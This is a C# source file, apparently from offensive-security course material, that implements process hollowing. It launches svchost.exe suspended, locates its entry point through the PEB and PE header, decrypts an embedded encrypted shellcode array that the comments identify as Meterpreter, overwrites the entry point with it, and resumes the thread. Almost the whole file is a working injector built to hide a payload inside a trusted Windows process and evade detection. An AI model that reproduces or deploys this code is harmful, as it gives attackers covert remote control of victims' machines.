using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Threading.Tasks;

namespace ProcessHollowingExe
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);


        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
               IntPtr hProcess,
               IntPtr lpBaseAddress,
               byte[] lpBuffer,
               Int32 nSize,
               out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
             STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(
                 null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            //fetch the address of the PEB from the PROCESS_BASIC_INFORMATION structure
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            //The ptrToImageBase variable now contains a pointer to the image base of svchost.exe
            //Following the DllImport, we can call ReadProcessMemory by specifying an 8 - byte buffer that is
            //then converted to a 64bit integer through the BitConverter.ToInt64278 method and then casted to a
            //pointer using (IntPtr)
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            //The following step is to parse the PE header to locate the EntryPoint.This is performed by calling
            //ReadProcessMemory again with a buffer size of 0x200 bytes
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            //To parse the PE header, we must read the content at offset 0x3C and use that as a second offset
            //when added to 0x28 convert the four bytes at offset e_lfanew plus 0x28 into an unsigned integer. 
            //This value is the offset from the image base to the EntryPoint
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            //The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual
            //address(RVA).We must add it to the image base to obtain the full memory address of the EntryPoint.
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            //This is encryped/shifted using the project
            //https://github.com/sbridgens/ProcessHollowing/tree/main/ShellCodeEncrypter
            byte[] buf = new byte[] {
              0x54,0xa2,0x27,0x2b,0x2a,0x92,0xc2,0x8e,0xca,0x41,0x62,0x04,0xe6,0x0b,0xea,0x36,0xd6,0xac,0x44,0x12,0xb0,0x4b,0x65,0xc5,0x4a,0x11,0x6a,0x9e,0x33,0x17,0xaf,0x62,0x45,0xc8,0xe3,0xdb,0x90,0x06,0x85,0xc5,0x25,0xe4,0x42,0x0b,0xe3,0xec,0x76,0x3b,0xc4,0x88,0x15,0x99,0x9e,0xb5,0xe0,0x63,0x86,0x1b,0xcf,0xdf,0xf2,0xad,0x67,0xfd,0x6b,0xd6,0x49,0x7e,0x7e,0xc0,0xec,0xce,0x6d,0xb0,0x82,0xca,0xa3,0xb3,0x6d,0xf5,0x2f,0x7f,0x47,0x92,0xd9,0xc7,0x69,0xe6,0x47,0xba,0xed,0xb6,0x5e,0x9a,0x3a,0x56,0x35,0x6e,0xac,0x82,0x1d,0x7c,0x9b,0x61,0x91,0x16,0x2f,0x37,0x35,0x2b,0x24,0x70,0xd9,0x1f,0x14,0xd6,0xb8,0xa3,0xdb,0x69,0x06,0x27,0x3b,0x18,0xce,0x80,0x2c,0xeb,0xce,0x9d,0x2a,0x3b,0x54,0x87,0x93,0x49,0xa4,0xa6,0xef,0x75,0xcf,0xb0,0xe6,0x88,0x41,0x70,0x92,0x60,0x10,0x77,0x2b,0x44,0xbd,0xfb,0x5a,0x72,0xe2,0x94,0xb2,0x00,0x3b,0x71,0xba,0x0e,0xba,0x0c,0x53,0x2d,0xac,0x48,0xda,0xa6,0xf5,0xa9,0x07,0x84,0x45,0xd6,0x2e,0x42,0xba,0x27,0x7f,0xf9,0xa1,0x0f,0x34,0x9d,0xb7,0x1c,0x30,0x0f,0x5c,0x9d,0x42,0x5f,0xfb,0xc6,0xb0,0xfe,0xf7,0x3b,0x25,0x2c,0xa9,0xf4,0x63,0xd9,0x36,0xd8,0x38,0x17,0xf3,0x2f,0xd2,0x56,0x2c,0xab,0xc2,0xf4,0x9c,0xf7,0x0c,0x80,0x5f,0x62,0x82,0x6f,0x11,0x9e,0x5d,0xe3,0x75,0x5f,0xff,0x1e,0x06,0xec,0x0e,0x0f,0x2e,0xd7,0x92,0x6b,0xdf,0x09,0x55,0x25,0x32,0xff,0xb1,0xd2,0x3d,0xd3,0xdd,0xc2,0x03,0xf4,0x2a,0x24,0x47,0xbc,0x20,0xe8,0xf2,0xab,0x9a,0x2c,0x21,0x95,0x64,0xd8,0xdb,0xac,0xf0,0xbc,0x5e,0x7f,0x8a,0x37,0xbc,0x3c,0x3c,0x95,0xc7,0x45,0x3d,0xdf,0x85,0x72,0xb1,0xd3,0x56,0xf5,0xa4,0xe4,0xab,0xdb,0x27,0xad,0x3e,0x62,0x50,0x33,0xd1,0x09,0x1d,0x53,0xf4,0xf7,0x39,0x2f,0x43,0x54,0xc8,0xb1,0xb9,0x81,0x1f,0xa2,0x10,0xb4,0xb1,0x08,0xd7,0xf1,0xef,0x73,0xd8,0x4e,0x2b,0x21,0x25,0x5f,0xdd,0xb1,0xf9,0xd2,0x1f,0xeb,0xae,0x22,0x01,0x69,0xc9,0xfa,0x2e,0xa4,0x11,0x49,0x0b,0xb1,0x91,0x1b,0x69,0x11,0x74,0x8b,0xda,0x52,0xab,0x00,0xc2,0xfc,0x14,0x5a,0x2f,0x9a,0x9b,0x49,0xc0,0xad,0x4d,0x71,0xc9,0xa7,0xb5,0x0a,0x52,0xb6,0x83,0x3a,0x3a,0x3c,0x2e,0xcd,0x05,0x8b,0xbe,0x9a,0x64,0x28,0x68,0x5a,0x2a,0xa4,0x7f,0x60,0xd4,0xaa,0xa1,0x27,0xf1,0x62,0x20,0xdc,0x82,0x67,0x6f,0x1c,0x66,0xc0,0x8e,0x39,0x9d,0xbd,0xc1,0xb6,0x1f,0xdc,0xee,0x44,0xb4,0x3f,0x40,0x28,0xab,0x18,0xf9,0xb7,0xad,0x93,0x6d,0xa1,0x9f,0x6e,0x8f,0x8d,0xcd,0x31,0x3b,0x1a,0x6b,0xa3,0x50,0x68,0x61,0x90,0xf2,0x19,0x40,0x33,0x07,0x37,0x46,0xc1,0xb2,0x58,0x5d,0xc4,0xd8,0xd9,0x93,0xe8,0x31,0xb8,0x14,0xad,0xd4,0x23,0x64,0x59,0x91,0xbc,0x42,0x0b,0x88,0xc9,0xe6,0x64,0x63,0x3b,0xf1,0x55,0xba,0x2a,0x65,0x4b,0xf5,0xb1,0x1a,0xb6,0xcb,0x6a,0xfe,0x24,0x90,0xf6,0xc2,0x94,0xac,0x63,0x2c,0xff,0xaa,0x47,0xc1,0xbf,0x9b,0x68,0x65,0x4f
            };



            buf = PFuncs.CaesarDecrypt(buf, args[0], Convert.FromBase64String(args[1]));

            //We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode
            //and use WriteProcessMemory to overwrite the existing code as shown in Listing 202.Remember
            //that we must add a DllImport statement for WriteProcessMemory before using it.
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            //When CreateProcessW started svchost.exe and populated the PROCESS_INFORMATION
            //structure, it also copied the handle of the main thread into it. 
            //We can then import ResumeThread and call it directly.
            ResumeThread(pi.hThread);
        }
    }
}

